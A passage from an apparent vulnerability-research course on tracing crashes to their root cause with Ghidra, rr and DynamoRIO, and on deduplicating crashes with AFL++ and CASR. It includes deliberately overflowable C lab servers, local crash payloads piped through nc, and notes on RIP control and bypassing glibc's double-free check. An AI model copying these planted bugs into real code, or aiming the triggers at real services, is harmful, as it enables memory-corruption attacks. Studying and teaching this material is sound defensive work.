        print(f"    {ref.getFromAddress()} -> {crash_addr} ({ref.getReferenceType()})")

    # Find references FROM this location (what does it access?)
    print(f"\n[+] References from crash instruction:")
    refs_from = getReferencesFrom(crash_addr)
    for ref in refs_from:
        print(f"    {crash_addr} -> {ref.getToAddress()} ({ref.getReferenceType()})")

    # Get basic block containing crash
    bbm = BasicBlockModel(currentProgram)
    block = bbm.getCodeBlockAt(crash_addr, monitor)
    if block:
        print(f"\n[+] Basic Block: {block.getFirstStartAddress()} - {block.getMaxAddress()}")

# Usage: Set crash address from debugger
crash_address = askString("Crash Address", "Enter crash RIP (e.g., 0x401234):")
analyze_crash_location(crash_address)
```

**Find Similar Vulnerable Patterns**:

- fix this script to make it work as you want

```python
# find_similar_bugs.py - Find code patterns similar to crash site
from ghidra.program.model.listing import CodeUnitIterator

def find_unchecked_copies(crash_func_name):
    """Find potentially similar bugs by pattern matching"""

    dangerous_funcs = ["strcpy", "strcat", "sprintf", "gets", "memcpy"]
    results = []

    for func_name in dangerous_funcs:
        func_addr = getSymbol(func_name, None)
        if func_addr is None:
            continue

        # Find all calls to this dangerous function
        refs = getReferencesTo(func_addr.getAddress())
        for ref in refs:
            if ref.getReferenceType().isCall():
                caller_func = getFunctionContaining(ref.getFromAddress())
                if caller_func:
                    results.append({
                        'dangerous_func': func_name,
                        'caller': caller_func.getName(),
                        'call_site': ref.getFromAddress()
                    })

    print(f"\n[+] Found {len(results)} calls to dangerous functions:")
    for r in results:
        print(f"    {r['caller']} calls {r['dangerous_func']} at {r['call_site']}")

    return results

find_unchecked_copies("vulnerable_function")
```

**Trace Data Flow to Crash** (Headless Mode):

- fix this script to make it work correctly

```python
# trace_to_crash.py - Run headless for batch analysis
# analyzeHeadless /path/to/project ProjectName -import binary -postScript trace_to_crash.py "0x401234"

import sys
from ghidra.app.decompiler import DecompInterface

def trace_data_sources(crash_addr_str):
    """Trace where data at crash location originates"""

    crash_addr = toAddr(crash_addr_str)
    func = getFunctionContaining(crash_addr)

    # Initialize decompiler
    decomp = DecompInterface()
    decomp.openProgram(currentProgram)

    # Decompile function
    results = decomp.decompileFunction(func, 30, monitor)
    if results.decompileCompleted():
        high_func = results.getHighFunction()

        print(f"\n[+] Decompiled {func.getName()}:")
        print(results.getDecompiledFunction().getC())

        # Find variables at crash point
        # (Advanced: Use Ghidra's PCode analysis for data flow)

    decomp.dispose()

if len(sys.argv) > 1:
    trace_data_sources(sys.argv[1])
```

**Key Ghidra APIs for Crash Analysis**:

| Task                    | API                                                |
| ----------------------- | -------------------------------------------------- |
| Get function at address | `getFunctionContaining(addr)`                      |
| Get instruction         | `getInstructionAt(addr)`                           |
| Find references         | `getReferencesTo(addr)`, `getReferencesFrom(addr)` |
| Decompile               | `DecompInterface().decompileFunction()`            |
| Search memory           | `findBytes(startAddr, pattern)`                    |
| Get call graph          | `FunctionManager.getFunctions()`                   |
| Symbol lookup           | `getSymbol(name, namespace)`                       |

### Practical Exercise

**Task**: Trace HTTP request to crash in vulnerable web server

**Setup**:

```c
// ~/crash_analysis_lab/src/tiny.c
// Simple vulnerable HTTP server for crash analysis exercise
// Compile: gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer tiny.c -o tiny_asan

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void process_header(const char *header) {
    printf("[*] Processing header: %s\n", header);
    // Simulate some processing
    if (strlen(header) > 100) {
        printf("[!] Header suspiciously long: %zu bytes\n", strlen(header));
    }
}

void handle_request(int fd) {
    char buffer[512];
    char header[128];

    // Read HTTP request
    ssize_t n = read(fd, buffer, sizeof(buffer) - 1);
    if (n <= 0) {
        perror("read");
        return;
    }
    buffer[n] = '\0';

    printf("[*] Received %zd bytes\n", n);

    // Parse header (VULNERABLE)
    // sscanf with %s has no bounds check - will overflow header buffer!
    sscanf(buffer, "GET %s HTTP/1.1", header);  // No bounds check!

    // Process request
    process_header(header);
}

int main(int argc, char *argv[]) {
    printf("[*] Tiny HTTP Server (vulnerable demo)\n");
    printf("[*] Reading request from stdin...\n");

    // For lab purposes, read from stdin instead of socket
    handle_request(STDIN_FILENO);

    printf("[*] Done.\n");
    return 0;
}
```

You can treat this tiny HTTP server as a stand-in for the parser-style fuzz targets you worked with in Week 2 (for example, HTTP/JSON/image parsers) and for the kinds of functions you saw being fixed in Week 3 patch diffing (like `Ipv6pReassembleDatagram` in CVE-2022-34718, or the archive extraction logic in the 7-Zip case study). The goal is to bridge those earlier fuzzing and diffing exercises by following a single crashing request all the way from socket read to the vulnerable function and, ultimately, the patched code path. If you've completed the Week 3 capstone on CVE-2024-38063 or CVE-2024-1086, you can apply the same reachability analysis to trace network packets or syscall paths to the vulnerable kernel functions you identified in the diff.

**Step 1: Identify Crash**:

```bash
# cd ~/crash_analysis_lab
# gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer src/tiny.c -o tiny_asan
echo "[*] Generating crash input..."

# Create crash input file
{
    printf "GET "
    python3 -c "print('A' * 200, end='')"
    printf " HTTP/1.1\r\n\r\n"
} > crash_input

echo "[*] Created crash_input ($(wc -c < crash_input) bytes)"
echo "[*] To trigger crash:"
echo "    ./tiny_asan < crash_input"
```

**Step 2: Record Execution**:

```bash
# Record with rr
rr record ./tiny_asan < crash_input

# Or collect coverage
drrun -t drcov -- ./tiny_asan < crash_input
```

**Step 3: Trace Data Flow**:

```bash
# Replay in GDB
rr replay

# Set breakpoint at handle_request entry
(gdb) break handle_request
(gdb) continue
# Stops at handle_request entry

# Step through to see buffer after read()
(gdb) next
(gdb) next   # past read()

# Inspect buffer contents - malicious input is now loaded
(gdb) print buffer
# $1 = "GET ", 'A' <repeats 200 times>...

(gdb) x/s buffer
# 0x70cba71000c0: "GET ", 'A' <repeats 196 times>...

# Continue to sscanf (the vulnerable call)
(gdb) next   # past if check
(gdb) next   # past buffer[n] = '\0'
(gdb) next   # past printf - now at sscanf line 34

# BEFORE triggering the crash, save a checkpoint
(gdb) checkpoint
# Checkpoint 1 at 0x578e117f3489

# Now trigger the overflow
(gdb) next
# ASan triggers: stack-buffer-overflow
# WRITE of size 201 at 0x... (header is only 128 bytes!)

# Restore checkpoint to go back to just before sscanf
(gdb) restart 1
# Back at line 34, before the overflow

# Inspect state just before overflow
(gdb) print buffer
# Shows the malicious input: "GET ", 'A' <repeats 200 times>...
(gdb) print header
# Shows uninitialized (overflow hasn't happened yet)
# Switch to handle_request frame in backtrace
(gdb) info locals
```

**Step 4: Visualize Path**:

```bash
# Load in IDA with Lighthouse
# Load coverage file from DynamoRIO
# Highlight path:
# read() → handle_request() → sscanf() → process_header() → crash

# Identify critical path:
# - Input read at offset 0x4000
# - Parsed at offset 0x4100
# - Vulnerable copy at offset 0x4234
# - Crash at offset 0x4256
```

**Step 5: Document Reachability**:

```markdown
## Reachability Analysis: HTTP Server Crash

### Input Vector

- **Source**: Network socket (TCP port 8080)
- **Format**: HTTP GET request
- **Attacker Control**: Full control of request path

### Data Flow Path

1. `read()` receives HTTP request into 512-byte buffer
2. `sscanf()` parses request path into 128-byte header buffer
3. `process_header()` calls `strcpy()` without bounds check
4. Stack buffer overflow overwrites return address
5. Return from `process_header()` jumps to attacker-controlled address

### Reachability Verdict

**FULLY REACHABLE** from network without authentication.

### Attack Complexity

- **Low**: No authentication required
- **Reliable**: Deterministic overflow
- **Remote**: Network-accessible

### Prerequisites

- Server listening on port 8080
- No firewall blocking access
- No rate limiting or IDS

### Proof

- DynamoRIO trace shows input → crash path
- rr replay confirms data flow
- 100% reproducible with crafted input
```

**Success Criteria**:

- Complete data flow traced from input to crash
- Critical functions identified
- Reachability confirmed
- Attack vector documented
- Exploitation prerequisites listed

### Key Takeaways

1. **Reachability determines exploitability**: Unreachable bugs aren't vulnerabilities
2. **Multiple approaches exist**: Coverage, tracing, static analysis all valuable
3. **Automation speeds analysis**: DynamoRIO + Lighthouse makes patterns obvious
4. **Replay debugging is powerful**: rr enables time-travel debugging
5. **Document the path**: Clear reachability proof essential for vulnerability reports

### Reachability Proof Standard Template

> [!IMPORTANT]
> **Every exploitability claim needs a proof.** Use this standardized template to document exactly how attacker-controlled input reaches the vulnerable code. This is your deliverable for Day 4.

#### The Reachability Proof Template

````markdown
# Reachability Proof: [Vulnerability Title]

## Target Information

- **Binary**: [name and version]
- **Platform**: [Linux x64 / Windows x64 / etc.]
- **Build**: [Debug/Release, with or without ASAN]

## Input Source → Sink Path

### Stage 1: Input Source

- **Entry Point**: [Function where input enters: read(), recv(), fgets(), etc.]
- **Data Type**: [Network packet / File / stdin / environment / argv]
- **Auth Required**: [Yes/No - if yes, what privileges?]
- **User Interaction**: [Required/Not required]

**Code Location**:

```c
// File: src/input.c:42
ssize_t n = read(fd, buffer, sizeof(buffer));  // <-- INPUT ENTERS HERE
```

### Stage 2: Parsing/Transformation Boundary

- **Parser Function**: [Function that first processes/validates input]
- **Validation Applied**: [None / Length check / Type check / etc.]
- **Transformation**: [Decode / Decompress / Convert / None]

**Code Location**:

```c
// File: src/parser.c:128
int len = parse_header(buffer, &header);  // <-- PARSING BOUNDARY
// No length validation before copy!
```

### Stage 3: Key Data Transformations

List each function that touches attacker data between input and sink:

| Step | Function        | File:Line    | Transformation | Attacker Control Preserved?      |
| ---- | --------------- | ------------ | -------------- | -------------------------------- |
| 1    | read()          | input.c:42   | Raw input      | Yes - full control               |
| 2    | parse_header()  | parser.c:128 | Extract fields | Yes - no sanitization            |
| 3    | process_field() | handler.c:89 | Copy to buffer | Yes - length attacker-controlled |

### Stage 4: Vulnerable Sink

- **Sink Function**: [memcpy / strcpy / free / indirect call / etc.]
- **Vulnerability Type**: [heap-overflow / stack-overflow / UAF / etc.]
- **Crash/Corruption Point**: [Exact instruction and address]

**Code Location**:

```c
// File: src/handler.c:95
memcpy(dest, src, attacker_len);  // <-- SINK: overflow here
```

## Data Flow Evidence

### Dynamic Trace (from rr/Intel PT/DynamoRIO)

```
read() [input.c:42]
  └─→ parse_header() [parser.c:128]
        └─→ process_field() [handler.c:89]
              └─→ memcpy() [handler.c:95]  ← CRASH
```

### Coverage Visualization

- **DynamoRIO trace file**: `drcov.target.12345.log`
- **Lighthouse screenshot**: [Attach or describe highlighted path]
- **Unique crash blocks**: [List addresses only hit during crash]

### Watchpoint Evidence (from GDB/rr)

```text
Watchpoint 1: *(char*)0x7fff1234 (input buffer first byte)
  Hit at parse_header+0x42 (read access)
  Hit at process_field+0x15 (read access)
  Hit at memcpy+0x10 (read access) ← being copied

Hardware watchpoint 2: *(char*)0x7fff5678 (destination buffer)
  Hit at memcpy+0x10 (write access) ← OVERFLOW WRITE
```

## Attack Surface Assessment

### Prerequisites for Exploitation

1. [Attacker can send network packet to port X]
2. [No authentication required]
3. [Etc.]

### Blocking Factors

- [ ] Requires authenticated session
- [ ] Rate limiting in place
- [ ] Input validation at boundary
- [ ] Sandbox/isolation
- [ ] None identified

### Attack Complexity Rating

- [ ] **LOW**: Direct path, no prerequisites, reliable trigger
- [ ] **MEDIUM**: Requires specific conditions or timing
- [ ] **HIGH**: Complex prerequisites, race conditions, partial control

## Proof of Concept

### Minimal Trigger

```bash
./target < minimal_crash.bin
```

### Crash Command + Expected Output

```bash
./target < minimal_crash.bin
#=================================================================
#==12345==ERROR: AddressSanitizer: heap-buffer-overflow...
```

## Verdict

**REACHABILITY**: [ ] CONFIRMED [ ] PARTIAL [ ] NOT REACHABLE

**JUSTIFICATION**: [1-2 sentences summarizing why the verdict]

**CONFIDENCE**: [ ] HIGH (traced full path) [ ] MEDIUM (some gaps) [ ] LOW (static only)
````

#### Lab: Network-Reachable Crash Analysis

**Setup**: A vulnerable HTTP server with a heap overflow in header parsing.

```c
// ~/crash_analysis_lab/src/vuln_http_server.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 8888
#define BUFSIZE 1024

typedef struct {
    char method[16];
    char path[64];      // Too small for long paths!
    char version[16];
} http_request_t;

void parse_request(char* raw, http_request_t* req) {
    // BUG: No bounds checking on path!
    sscanf(raw, "%s %s %s", req->method, req->path, req->version);
}

void handle_client(int client_fd) {
    char buffer[BUFSIZE];
    http_request_t* req = malloc(sizeof(http_request_t));
    if (!req) {
        perror("malloc");
        return;
    }

    ssize_t n = read(client_fd, buffer, BUFSIZE - 1);
    if (n > 0) {
        buffer[n] = '\0';
        printf("[*] Received %zd bytes\n", n);
        parse_request(buffer, req);
        printf("[*] Request: %s %s %s\n", req->method, req->path, req->version);
    }
    free(req);
}

int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PORT),
        .sin_addr.s_addr = INADDR_ANY
    };

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));

    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen");
        return 1;
    }

    printf("[*] Vulnerable HTTP Server listening on port %d...\n", PORT);

    while(1) {
        int client_fd = accept(server_fd, NULL, NULL);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }
        handle_client(client_fd);
        close(client_fd);
    }
}
```

**Step 1: Build and Test**:

```bash
cd ~/crash_analysis_lab

# Compile with ASan
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer \
    src/vuln_http_server.c -o vuln_http_server_asan

# Start server in background
./vuln_http_server_asan &
SERVER_PID=$!
sleep 1

# Test normal request
echo -e "GET /index.html HTTP/1.1\r\n\r\n" | nc localhost 8888
# Should work: Request: GET /index.html HTTP/1.1

# Test crash request - single long token overflows the method[16] buffer first
# sscanf stops at whitespace, so we need one long token
python3 -c "print('A'*300 + '\r\n\r\n')" | nc localhost 8888
# ASan reports: heap-buffer-overflow
# WRITE of size 300 at method[16]

# Clean up
kill $SERVER_PID 2>/dev/null
```

**Step 2: Record and Trace with rr**:

```bash
# Record the server handling a crash request
# Terminal 1: Start server under rr
rr record ./vuln_http_server_asan

# Terminal 2: Send crashing request
sleep 2
python3 -c "print('A'*300 + '\r\n\r\n')" | nc localhost 8888

# After crash, replay in GDB
rr replay

# Set breakpoint at handle_client entry
(gdb) break handle_client
(gdb) continue
# Stops when client connects

# Step through to see buffer after read()
(gdb) next
(gdb) next
(gdb) next
(gdb) next   # past read()

# Inspect the received HTTP request
(gdb) print buffer
# $3 = 'A' <repeats 300 times>...

(gdb) print n
#$4 = 305

# Continue to parse_request
(gdb) break parse_request
(gdb) continue

# Now inside parse_request - save checkpoint before overflow
(gdb) checkpoint
# Checkpoint 1 saved
# Trigger the overflow
(gdb) next
# ASan triggers: heap-buffer-overflow
# WRITE of size 300 at req->path (only 64 bytes!)

# Restore checkpoint to inspect pre-crash state
(gdb) restart 1

# Examine the request struct before overflow
(gdb) print *req
# Shows method, path, version fields
(gdb) print sizeof(req->path)
# Shows: 64 (the undersized buffer)

# Examine raw input
(gdb) print raw
# Shows the malicious HTTP request
```

**Step 3: Fill Out Proof Template**:

Complete the Reachability Proof Template for this vulnerability:

1. **Input Source**: `read()` from network socket (TCP port 8888)
2. **Parsing Boundary**: `parse_request()` with `sscanf()`
3. **Sink**: `sscanf()` writing to undersized `req->path[64]`
4. **Data Flow**: `accept()` → `read()` → `parse_request()` → `sscanf()` → heap overflow
5. **Evidence**: rr trace, checkpoint/restart, ASan report showing heap-buffer-overflow

**Deliverable**: A completed Reachability Proof document following the template.

**Success Criteria**:

- All template sections filled in with evidence
- Dynamic trace shows complete path from socket to overflow
- Attack surface correctly assessed (remote, unauthenticated)
- PoC command that triggers crash remotely:
  ```bash
  python3 -c "print('A'*300 + '\r\n\r\n')" | nc localhost 8888
  ```

### Discussion Questions

1. How does attack surface (local vs remote) affect reachability assessment?
2. What are the limitations of coverage-based reachability analysis with DynamoRIO/Lighthouse?
3. How does rr's time-travel debugging change the approach to tracing input propagation compared to traditional forward-only debugging?
4. When might static call graph analysis miss actual execution paths?

## Day 5: Crash Deduplication and Corpus Minimization

- **Goal**: Learn to efficiently deduplicate crashes and minimize test cases for easier analysis.
- **Activities**:
  - _Reading_:
    - "Fuzzing for Software Security Testing and Quality Assurance" by Ari Takanen - Chapter 9: Fuzzing Case Studies
    - [AFL++ Corpus Minimization](https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md)
  - _Online Resources_:
    - [Test Case Reduction Strategies](https://lcamtuf.coredump.cx/afl/technical_details.txt)
    - [Delta Debugging Algorithm](https://www.st.cs.uni-saarland.de/papers/tse2002/tse2002.pdf)
  - _Tool Setup_:
    - afl-tmin (test case minimizer)
    - afl-cmin (corpus minimizer)
    - creduce / llvm-reduce (for source code)
  - _Exercise_:
    - Deduplicate and minimize crashes from vulnerable_suite
    - Reduce crash input to minimal reproducer

### Lab Setup: Building AFL-Instrumented Binary

For coverage-based deduplication and AFL tools (afl-tmin, afl-cmin), you need an AFL-instrumented build:

```bash
cd ~/crash_analysis_lab/src

# Build AFL-instrumented version (requires AFL++ installed)
afl-clang-fast -g -o ../vuln_afl vulnerable_suite.c

# Verify instrumentation
afl-showmap -o /dev/null -- ../vuln_afl 1 "test"
# Should show output similar to:
# [+] Hash of coverage map: cfa0609563552e5b
# [+] Captured 2 tuples (map size 26, highest value 1, total values 2) in '/dev/null'.
```

> [!NOTE] If you don't have AFL++ installed, you can skip the coverage-based methods and use stack-hash or CASR-based deduplication instead.

### Why Deduplication and Minimization Matter

**The Problem**:

- Fuzzing generates thousands of crashes
- Many are duplicates (same bug, different input)
- Large inputs make analysis difficult
- Need efficient prioritization

**Benefits of Deduplication**:

- Focus on unique bugs, not symptoms
- Reduce analysis time from days to hours
- Better resource allocation
- Clear bug count for tracking

**Benefits of Minimization**:

- Smaller inputs easier to understand
- Faster crash reproduction
- Clearer root cause identification
- Simpler exploit development

### Crash Deduplication Strategies

#### Method 1: Stack Trace Hashing

**Concept**: Hash the call stack to identify unique crashes

**Pros**:

- Fast and simple
- Deterministic
- No special tools needed

**Cons**:

- Different stacks can be same bug
- Non-deterministic bugs may vary
- Address randomization affects hashing

**Implementation**:

```bash
#!/bin/bash
# dedupe_by_stack.sh
cd ~/crash_analysis_lab

for crash in crashes/*; do
    # Get stack trace
    stack=$(gdb -batch \
        -ex "run < $crash" \
        -ex "bt" \
        -ex "quit" \
        ./vuln_no_protect 2>&1 | grep "^#")

    # Hash stack (ignore addresses)
    hash=$(echo "$stack" | \
        sed 's/0x[0-9a-f]\{8,16\}//g' | \
        md5sum | cut -d' ' -f1)

    # Create directory for this hash
    mkdir -p deduped/$hash

    # Copy first crash with this hash
    if [ ! -f deduped/$hash/crash ]; then
        cp $crash deduped/$hash/crash
        echo "$crash -> $hash"
    fi
done

echo "Unique crashes: $(ls -1 deduped/ | wc -l)"
```

#### Method 2: Coverage-Based Deduplication

**Concept**: Hash the code coverage path

**Pros**:

- More accurate than stack traces
- Captures execution flow
- Works with non-deterministic crashes

**Cons**:

- Requires instrumentation
- Slower than stack hashing
- May over-deduplicate

**Implementation**:

```bash
#!/bin/bash
# dedupe_by_coverage.sh
cd ~/crash_analysis_lab

mkdir -p deduped

for crash in crashes/*; do
    name=$(basename "$crash")

    # Get a stable coverage signature from afl-showmap output.
    # -q: quiet
    # -e: edges only (ignore hit counts)
    # -o: output file
    # -H: file that replaces @@ (file-input targets)
    # Note: Requires AFL-instrumented build (afl-clang-fast)
    afl-showmap -q -e -o "/tmp/${name}.cov" -H "$crash" -- ./vuln_afl @@ >/dev/null 2>&1 || true

    hash=$(md5sum "/tmp/${name}.cov" | cut -d' ' -f1)
    mkdir -p "deduped/$hash"

    if [ ! -f "deduped/$hash/crash" ]; then
        cp "$crash" "deduped/$hash/crash"
    fi
done
```

#### Method 3: CASR-Based Deduplication (Recommended)

**Concept**: Use CASR's semantic crash classification

**Pros**:

- Semantically meaningful (23 severity types)
- Built-in clustering algorithm
- Modern, actively maintained
- Considers crash type, location, and severity

**Cons**:

- Requires ASAN build for best results
- Some setup required

**Implementation**:

```bash
#!/bin/bash
# dedupe_by_casr.sh
cd ~/crash_analysis_lab

# Generate CASR reports for each crash
for crash in crashes/*; do
    name=$(basename $crash)
    casr-san -o casrep/${name}.casrep -- ./vuln_asan < $crash 2>/dev/null
done

# Use CASR's built-in clustering
casr-cluster -c casrep/ deduped/

# Review clusters
echo "Unique crash clusters:"
for cluster in deduped/cl*; do
    count=$(ls -1 $cluster/*.casrep 2>/dev/null | wc -l)
    # Get representative crash type
    type=$(jq -r '.CrashSeverity.ShortDescription' $cluster/*.casrep 2>/dev/null | head -1)
    echo "  $(basename $cluster): $count crashes - $type"
done

# Expected output (example):
# Number of clusters: 8
# Unique crash clusters:
#   cl1: 1 crashes - double-free
#   cl2: 1 crashes - AbortSignal
#   cl3: 1 crashes - heap-buffer-overflow(write)
#   cl4: 1 crashes - DestAvNearNull
#   cl5: 1 crashes - DestAvNearNull
#   cl6: 1 crashes - stack-buffer-overflow(write)
#   cl7: 1 crashes - heap-use-after-free(read)
#   cl8: 3 crashes - ReturnAv
#   clerr: 2 crashes - AbortSignal
```

> [!NOTE] The `clerr` cluster contains crashes that CASR couldn't fully classify
> (e.g., AbortSignal from ASAN reports without clear memory corruption).
> The DestAvNearNull clusters indicate potential NULL pointer dereferences.

**Alternative: Pwndbg-Based Analysis** (Interactive):

> [!WARNING] The crash files in this lab contain test numbers and inputs formatted for the ASAN build. For GDB analysis, you need to pass arguments directly rather than via stdin.

```bash
#!/bin/bash
# For manual interactive analysis with proper argument passing
cd ~/crash_analysis_lab

# Generate overflow payloads
STACK_PAYLOAD=$(python3 -c "print('A'*100)")
HEAP_PAYLOAD=$(python3 -c "print('B'*60)")

echo "=== Stack Overflow Analysis ==="
gdb -batch \
    -ex "run 1 $STACK_PAYLOAD" \
    -ex "bt" \
    -ex "checksec" \
    -ex "quit" \
    ./vuln_no_protect

echo "=== Heap Overflow Analysis ==="
gdb -batch \
    -ex "run 2 $HEAP_PAYLOAD" \
    -ex "bt" \
    -ex "checksec" \
    -ex "quit" \
    ./vuln_no_protect

# Note: Heap overflow may not crash immediately without ASAN!
# Use ASAN build to detect: ./vuln_asan 2 "$HEAP_PAYLOAD"

echo "=== Use-After-Free Analysis ==="
gdb -batch \
    -ex "run 3" \
    -ex "bt" \
    -ex "checksec" \
    -ex "quit" \
    ./vuln_no_protect

echo "=== Double-Free Analysis ==="
gdb -batch \
    -ex "run 4" \
    -ex "bt" \
    -ex "checksec" \
    -ex "quit" \
    ./vuln_no_protect
```

**Expected Output (Stack Overflow)**:

```text
=== Stack Overflow Analysis ===
[*] Copying input to 64-byte buffer...
[*] Buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401225 in stack_overflow (input=0x7fffffffe491 'A' <repeats 100 times>) at vulnerable_suite.c:11
#0  0x0000000000401225 in stack_overflow (input=...) at vulnerable_suite.c:11
#1  0x4141414141414141 in ?? ()
#2  0x4141414141414141 in ?? ()
#3  0x4141414141414141 in ?? ()
Backtrace stopped: Cannot access memory at address 0x4141414141414149

File:     /home/dev/crash_analysis_lab/vuln_no_protect
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
```

> [!TIP] **Analysis Notes**:
>
> - Return address overwritten with `0x4141414141414141` ('AAAA...' in hex) = **RIP control achieved**
> - No stack canary + Executable stack + No PIE = **Highly exploitable**
> - The crash at `vulnerable_suite.c:11` indicates the function epilogue (`ret` instruction)

**Expected Output (Heap Overflow - No Crash)**:

```text
=== Heap Overflow Analysis ===
[*] Allocated 32 bytes at 0x4052a0
[*] Buffer: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
[Inferior 1 (process 2116) exited normally]
No stack.
```

> [!WARNING] **Why No Crash?**
> Heap overflows often don't cause immediate crashes without sanitizers:
>
> - The overflow corrupts adjacent heap metadata/data **silently**
> - Crash may only occur later during `free()` or when corrupted data is accessed
> - Use ASAN build to detect: `./vuln_asan 2 "$HEAP_PAYLOAD"` will report `heap-buffer-overflow`
> - This demonstrates why **sanitizers are essential** for finding heap corruption bugs

**Expected Output (Use-After-Free - No Crash)**:

```text
=== Use-After-Free Analysis ===
[*] Allocated at 0x4052a0: Hello, World!
[*] Freed, now accessing...
[*] UAF read:
[Inferior 1 (process 2131) exited normally]
No stack.
```

> [!WARNING] **Why No Crash?**
> Use-after-free bugs are often silent without sanitizers:
>
> - The freed memory is accessed but returns **garbage/stale data** (notice empty UAF read)
> - Memory may still be mapped, just marked as "free" in the allocator
> - A crash only occurs if the page is unmapped or memory is reused with different data
> - Use ASAN build to detect: `./vuln_asan 3` will report `heap-use-after-free`
> - **UAF bugs are highly exploitable** - attacker can control what replaces the freed object

**Expected Output (Double-Free - Crashes!)**:

```text
=== Double-Free Analysis ===
[*] Allocated at 0x4052a0
[*] First free done
free(): double free detected in tcache 2

Program received signal SIGABRT, Aborted.
__pthread_kill_implementation (no_tid=0, signo=6, threadid=<optimized out>) at ./nptl/pthread_kill.c:44
#0  __pthread_kill_implementation (...) at ./nptl/pthread_kill.c:44
#1  __pthread_kill_internal (signo=6, ...) at ./nptl/pthread_kill.c:78
#2  __GI___pthread_kill (...) at ./nptl/pthread_kill.c:89
#3  0x00007ffff7c4527e in __GI_raise (sig=6) at ../sysdeps/posix/raise.c:26
#4  0x00007ffff7c288ff in __GI_abort () at ./stdlib/abort.c:79
#5  0x00007ffff7c297b6 in __libc_message_impl (...) at ../sysdeps/posix/libc_fatal.c:134
#6  0x00007ffff7ca8ff5 in malloc_printerr (str=0x7ffff7dd1bf0 "free(): double free detected in tcache 2")
#7  0x00007ffff7cab55f in _int_free (...) at ./malloc/malloc.c:4541
#8  0x00007ffff7caddae in __GI___libc_free (mem=0x4052a0) at ./malloc/malloc.c:3398
#9  0x0000000000401390 in double_free () at vulnerable_suite.c:39
#10 0x0000000000401558 in main (argc=2, argv=0x7fffffffe228) at vulnerable_suite.c:68
```

> [!TIP] **Analysis Notes (Double-Free)**:
>
> - **glibc tcache detection triggered**: Modern glibc (2.26+) includes tcache double-free mitigation
> - Stack trace shows: `double_free()` → `__libc_free()` → `_int_free()` → `malloc_printerr()` → `abort()`
> - The error message `"free(): double free detected in tcache 2"` is the tcache key check
> - **SIGABRT** (signal 6) = program called `abort()` due to detected corruption
> - This mitigation can be bypassed in exploitation scenarios (e.g., filling tcache first)

#### Method 4: Combined Approach

```bash
#!/bin/bash
# dedupe_combined.sh
cd ~/crash_analysis_lab

for crash in crashes/*; do
    # 1. Get stack hash
    stack=$(gdb -batch \
        -ex "run < $crash" \
        -ex "bt" \
        -ex "quit" \
        ./vuln_no_protect 2>&1 | grep "^#")

    stack_hash=$(echo "$stack" | \
        sed 's/0x[0-9a-f]\{8,16\}//g' | \
        md5sum | cut -d' ' -f1)

    # 2. Get CASR severity hash
    casr_hash=$(casr-san -- ./vuln_asan < $crash 2>&1 | \
        grep -E "ShortDescription|CrashLine" | md5sum | cut -d' ' -f1)

    # Combined hash
    combined=$(echo "$stack_hash $casr_hash" | md5sum | cut -d' ' -f1)

    mkdir -p deduped/$combined
    if [ ! -f deduped/$combined/crash ]; then
        cp $crash deduped/$combined/crash
        echo "$stack_hash,$casr_hash" > deduped/$combined/hashes.txt
    fi
done
```

### Differential Crash Analysis

**Concept**: Compare similar crashes to understand root cause variations and identify distinct bugs that appear similar.

**When to Use**:

- Multiple crashes in same function but different behaviors
- Crashes that look similar but have different exploitability
- Understanding crash variants from the same bug class

**Differential Analysis Workflow (for .casrep files)**:

```bash
#!/bin/bash
# diff_casrep.sh - Compare two existing CASR report files
# Usage: ./diff_casrep.sh <crash_a.casrep> <crash_b.casrep>

REPORT_A="$1"
REPORT_B="$2"

echo "=== Differential Crash Analysis (CASREP) ==="

# Compare severity
echo -e "\n[1] Severity Comparison:"
echo "Crash A: $(jq -r '.CrashSeverity.ShortDescription' "$REPORT_A")"
echo "Crash B: $(jq -r '.CrashSeverity.ShortDescription' "$REPORT_B")"

# Compare crash locations
echo -e "\n[2] Crash Location:"
echo "Crash A: $(jq -r '.CrashLine' "$REPORT_A")"
echo "Crash B: $(jq -r '.CrashLine' "$REPORT_B")"

# Compare stack traces (first 5 frames)
echo -e "\n[3] Stack Trace Comparison:"
echo "Crash A top frames:"
jq -r '.Stacktrace[:5][]' "$REPORT_A" 2>/dev/null || jq -r '.StackTrace[:5][]' "$REPORT_A" 2>/dev/null
echo "---"
echo "Crash B top frames:"
jq -r '.Stacktrace[:5][]' "$REPORT_B" 2>/dev/null || jq -r '.StackTrace[:5][]' "$REPORT_B" 2>/dev/null

# Compare ASAN description if available
echo -e "\n[4] ASAN Description:"
echo "Crash A: $(jq -r '.AsanReport // "N/A"' "$REPORT_A" | head -3)"
echo "Crash B: $(jq -r '.AsanReport // "N/A"' "$REPORT_B" | head -3)"

# Determine if same bug
echo -e "\n[5] Same Bug Assessment:"
line_a=$(jq -r '.CrashLine' "$REPORT_A")
line_b=$(jq -r '.CrashLine' "$REPORT_B")
if [ "$line_a" == "$line_b" ]; then
    echo "LIKELY SAME BUG - Same crash line: $line_a"
else
    echo "POSSIBLY DIFFERENT BUGS"
    echo "  Crash A: $line_a"
    echo "  Crash B: $line_b"
fi
```

**Usage Examples**:

```bash
cd ~/crash_analysis_lab

